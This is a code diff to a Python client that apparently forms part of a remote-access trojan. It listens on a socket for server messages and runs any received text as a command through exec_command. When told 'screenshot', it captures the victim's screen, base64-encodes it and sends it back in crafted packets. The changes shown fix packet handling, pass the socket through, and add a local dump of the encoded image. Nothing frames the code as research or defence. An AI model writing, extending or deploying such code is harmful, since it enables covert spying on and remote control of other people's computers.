@@ -39,18 +39,20 @@ def send_data(sock: socket.socket, msg):
 
 def packet_crafting(msg: str):
     data_size = len(msg) + 4 # Plus the header
+    packets = []
     if (data_size > 8192) :
         packets = img_to_packets(msg)
-        return
     
-    packet_size = int((np.ceil(data_size/1024)*1024))
-    msg_encoded = msg.encode('utf-8')
-    header_encoded = packet_size.to_bytes(4, 'little')
-    packet = header_encoded + msg_encoded
-    # print(f'Header : {packet_size}')
-    # print(f'Packet size : {len(packet)} - Crafted packet : {packet}')
+    else :
+        packet_size = int((np.ceil(data_size/1024)*1024))
+        msg_encoded = msg.encode('utf-8')
+        header_encoded = packet_size.to_bytes(4, 'little')
+        packet = header_encoded + msg_encoded
+        # print(f'Header : {packet_size}')
+        # print(f'Packet size : {len(packet)} - Crafted packet : {packet}')
+        packets = [packet]
 
-    return list(packet)
+    return packets
 
 # REFACTOR : fusion the header part
 def img_to_packets(img_base64):
@@ -66,8 +68,11 @@ def img_to_packets(img_base64):
 
     return packets
 
+def b64_to_txt(b64):
+    with open('img_b64.txt', 'wb') as fs:
+        fs.write(b64)
 
-def send_screenshot():
+def send_screenshot(sock: socket.socket):
     with mss() as sct:
         sct.compression_level = 9 # max compression = +- 50 000 bytes file
         time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
@@ -82,8 +87,9 @@ def send_screenshot():
         with open(img_path, 'rb') as img_file:
             data = base64.b64encode(img_file.read())
             string_chunking = data.decode('utf-8')
+            b64_to_txt(data)
 
-            send_data(string_chunking)
+            send_data(sock, string_chunking)
 
 
 def get_data(sock: socket.socket):
@@ -91,7 +97,7 @@ def get_data(sock: socket.socket):
         res = sock.recv(1024).decode('utf-8')
         print(f'Server response : {res}')
         if res == 'screenshot':
-            send_screenshot()
+            send_screenshot(sock)
         elif res != 'Alive ping back received':
             command = res.split(' ')
             res = exec_command(command)
